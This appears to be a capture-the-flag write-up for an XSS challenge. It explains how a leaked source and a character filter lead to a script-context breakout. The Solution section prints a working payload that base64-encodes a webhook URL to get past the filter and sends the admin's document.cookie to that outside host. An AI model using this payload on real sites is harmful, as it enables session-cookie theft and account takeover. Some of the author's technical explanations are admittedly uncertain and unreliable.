**This writeup credit goes to [@vicevirus](https://github.com/vicevirus) and [@w0rmhol3](https://github.com/w0rmhol3) for teaching me on this challenge.**

![image](https://github.com/user-attachments/assets/5cc5bd19-24e2-4c64-b3d9-86073416b1b1)
<br>Hint 1: Can we execute code inside the script tag?
<br>Hint 2: Javascript code will not execute if got syntax error
<br>Hint 3: Try to execute your payload in developer tools > console tab

# Exploration
Same thing as XSS-GPT, we need to send XSS payload to admin for admin cookie's.
<br> After tinkering with the request settings, I was able to trigger an error and return some source code behind ther server.
<br> Instead of sending content-type as ```application/x-www-form-urlencoded```, send it as ```application/json```.
![image](https://github.com/user-attachments/assets/fa804b46-52cd-48f7-a6f9-97e8950a159d)
<br> This is a bit hard to see, let me show you how to trigger a response with chrome console tab.

![image](https://github.com/user-attachments/assets/b030b47b-2397-4b88-9bc1-cfdccd787452)
![image](https://github.com/user-attachments/assets/6a697427-bf9c-49b9-9a11-6bc74da058e3)
![image](https://github.com/user-attachments/assets/971e63dd-1865-42f3-9441-3ca9f72d6276)
![image](https://github.com/user-attachments/assets/b096a404-5d9e-4d45-9603-e37b789cfcf0)

Now we can scroll thru some of the source code given, then i notice this special line of code.
![image](https://github.com/user-attachments/assets/9a000faa-184c-443d-89b0-fde992dfee9f)
<br> This a line code basically means that if our payload has any <, > or //. It will not execute the admin viewing.
<br> equally meaning the method of using <script> tag won't work here.
![image](https://github.com/user-attachments/assets/1f21d977-8bb2-4618-8f5b-f05cf3eda684)
<br> Based on the source code, a lot of people first instinct is to play around the "" to escape it and run custom code. (AHEMMM*** me too)
<br> However, that would'nt work as because javascript doesn't allow one line with multi execution within a function.
<br> that means i can't do this, code1; code2; code3; (it will trigger error and not run)

**Note: I'm not sure about the explaination is correct, contact me on discord if I made a mistake. Discord: DTX#7791**

<br>Therefore, the trick is to spilt the function in three function. one to close the function above, one to close function below, one for the payload. (Thanks to the sifu mentioned above telling me this)

# Solution
the payload should look something like this
<br>```");}(function(){location.href=atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvNjQ2NzkwMTEtN2EyNS00NmIzLThlYTEtMGE4NmM2NTQyYTMzP2M9')+document.cookie})();function h(){alert("```

<br>```');}``` is use to close the sendRequest() function
<br>```function h(){alert("``` is use to create a new function called h to close the function bracket below. and alert(" to close the leftover ");
<br>lastly the middle part is the payload, we need to convert the url to base64 because https:// syntax will trigger the filter.

Make sure encode the payload with URL encoding.
![image](https://github.com/user-attachments/assets/b3d121f2-1375-47ca-8afb-b0ef935affc9)
![image](https://github.com/user-attachments/assets/de3fa1be-2114-49a2-b7a3-4d69ef3af1ba)
![final](https://github.com/user-attachments/assets/ccd835d4-7467-4c85-b945-662460a03b7d)

